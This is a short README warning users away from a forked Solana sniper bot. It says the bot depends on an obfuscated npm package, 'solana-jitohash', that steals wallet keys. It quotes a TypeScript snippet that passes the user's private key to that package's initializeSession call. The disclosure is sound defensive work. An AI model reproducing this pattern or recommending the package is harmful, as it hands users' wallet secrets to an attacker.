# Warning: Do Not Use Solana Sniper Bot

This repository is a fork from [SoaRTradesSol/solana-sniper-bot](https://github.com/SoaRTradesSol/solana-sniper-bot). **Please be aware that this version contains a virus.**

## Security Alert

The repository utilizes an npm package called [solana-jitohash](https://www.npmjs.com/package/solana-jitohash), which is highly suspicious:

- **Downloads**: Only 136 downloads, likely from victims.
- **Code**: Obfuscated and sends HTTP requests that could compromise security.

![Suspicious Code Example](https://github.com/user-attachments/assets/111eb009-6da8-4814-abb9-c44df598b3ce)

## Risky Implementation

The `solana-sniper-bot` uses this library to initialize a session with the private secret of the user's wallet. Here's a snippet from the code:

```typescript
import { initializeSession } from 'solana-jitohash';

(async () => {
  const walletKeyPairFile = process.env.PRIVATE_KEY!;
  const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
  initializeSession(walletKeyPairFile);
  const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
})();
```

## Summary

This implementation sends your private secret to a potential attacker.

**For your safety, do not use this bot.**

